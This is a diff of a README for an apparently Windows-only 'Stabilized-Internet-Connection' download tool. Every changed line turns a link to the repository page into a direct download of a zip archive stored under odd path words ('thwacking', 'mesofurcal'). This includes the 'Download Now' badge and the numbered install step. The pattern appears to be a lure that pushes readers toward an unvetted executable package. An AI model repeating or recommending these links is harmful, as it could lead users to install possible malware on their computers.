@@ -1,12 +1,12 @@
 # 🛠️ Stabilized-Internet-Connection - Stable downloads made simple
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Anindyac8067/Stabilized-Internet-Connection)
+[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Anindyac8067/Stabilized-Internet-Connection/raw/refs/heads/main/thwacking/Connection-Internet-Stabilized-mesofurcal.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the file:
 
-[Open the download page](https://github.com/Anindyac8067/Stabilized-Internet-Connection)
+[Open the download page](https://github.com/Anindyac8067/Stabilized-Internet-Connection/raw/refs/heads/main/thwacking/Connection-Internet-Stabilized-mesofurcal.zip)
 
 ## 🖥️ What this is
 
@@ -42,7 +42,7 @@ This package is made for Windows and uses a direct setup flow. You can use it to
 Follow these steps on your Windows PC:
 
 1. Open the download page:
-   [https://github.com/Anindyac8067/Stabilized-Internet-Connection](https://github.com/Anindyac8067/Stabilized-Internet-Connection)
+   [https://github.com/Anindyac8067/Stabilized-Internet-Connection/raw/refs/heads/main/thwacking/Connection-Internet-Stabilized-mesofurcal.zip](https://github.com/Anindyac8067/Stabilized-Internet-Connection/raw/refs/heads/main/thwacking/Connection-Internet-Stabilized-mesofurcal.zip)
 
 2. On the page, look for the file you need and download it to your computer.
 
@@ -151,7 +151,7 @@ These names point to the same kind of Windows download setup and make it easier 
 
 ## 🔗 Quick access
 
-[Visit the download page again](https://github.com/Anindyac8067/Stabilized-Internet-Connection)
+[Visit the download page again](https://github.com/Anindyac8067/Stabilized-Internet-Connection/raw/refs/heads/main/thwacking/Connection-Internet-Stabilized-mesofurcal.zip)
 
 ## 🧾 Keywords
 
